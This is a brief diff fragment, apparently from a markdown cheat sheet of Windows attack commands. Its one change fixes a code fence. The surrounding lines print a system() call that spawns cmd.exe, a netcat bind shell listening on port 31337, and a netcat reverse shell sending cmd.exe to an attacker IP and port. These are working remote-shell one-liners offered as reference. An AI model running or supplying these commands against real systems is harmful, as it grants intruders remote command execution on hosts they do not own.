@@ -64,7 +64,7 @@ $ system("start cmd.exe /k $cmd")
 * Bind cmd to a port
 ```cmd2
 $ nc.exe -Lp 31337 -vv -e cmd.exe
-``
+```
 * Reverse Shell 
 ```cmd3
 $ nc.exe attacker_ip attacker_port -e cmd.exe
